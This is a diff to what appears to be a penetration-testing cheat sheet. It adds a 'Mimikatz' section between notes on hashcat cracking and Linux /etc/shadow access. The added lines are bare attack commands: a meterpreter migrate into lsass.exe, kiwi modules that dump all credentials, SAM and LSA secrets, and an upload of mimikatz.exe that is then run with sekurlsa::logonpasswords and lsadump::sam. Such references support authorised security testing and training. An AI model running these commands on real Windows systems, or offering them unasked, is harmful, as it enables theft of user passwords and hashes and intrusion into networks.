@@ -1288,6 +1288,26 @@ hashcat -m 1000 -a 3 hashes.txt /usr/share/wordlists/rockyou.txt
 cat .hashcat/hashcat.potfile
 ```
 
+#### Mimikatz
+```
+meterpreter > migrate -N lsass.exe
+meterpreter > load kiwi
+meterpreter > creds_all
+meterpreter > lsa_dump_sam
+meterpreter > lsa_dump_secrets
+```
+```
+meterpreter > upload /usr/share/windows-resources/binaries/mimikatz/x64/mimikatz.exe
+meterpreter > ls
+meterpreter > shell
+
+.\mimikatz.exe
+
+mimikatz# privilege::debug
+mimikatz# sekurlsa::logonpasswords
+mimikatz# lsadump::sam
+```
+
 ### Linux
 [<< Index](#Index)
 - Need privileges to access `/etc/shadow`
